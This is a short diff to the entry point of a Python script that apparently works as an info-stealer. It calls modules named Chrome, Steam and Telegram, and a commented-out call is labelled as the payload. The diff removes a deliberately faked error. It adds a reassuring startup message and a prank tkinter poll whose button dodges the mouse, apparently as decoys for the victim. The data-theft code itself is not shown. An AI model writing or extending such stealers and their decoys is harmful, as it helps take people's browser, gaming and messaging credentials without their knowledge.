@@ -439,6 +439,7 @@ class Steam:
 
 
 if __name__ == '__main__':
+	print('Зупуск программы ожидайте)')
 	Support.start()
 	# Some_load.main() # полезная нагрузка
 	Chrome.main()
@@ -446,4 +447,28 @@ if __name__ == '__main__':
 	Steam.main()
 	Telegram.main()
 
-	os.remove('c:\\gаmedata\\data')  # создаем ошибку, типа ты говнокодер
+	
+from tkinter import *
+from tkinter import messagebox
+import random
+
+def Yes():
+    messagebox.showinfo(' ', 'Мда... )')
+    quit()
+
+def motionMouse(event):
+    btnNo.place(x=random.randint(0, 300), y=random.randint(0, 300))
+
+root=Tk()
+root.geometry('400x400')
+root.title('Oпрос')
+root.resizable(width=False, height=False)
+root['bg'] = 'white'
+
+label = Label(root, text='Любишь маму?', font='Arial 20 bold', bg='white').pack()
+btnYes = Button(root, text='Нет', font='Arial 20 bold', command=Yes).place(x=160, y=100)
+btnNo = Button(root, text='Да', font='Arial 20 bold')
+btnNo.place(x=250, y=100)
+btnNo.bind('<Enter>', motionMouse)
+
+root.mainloop()
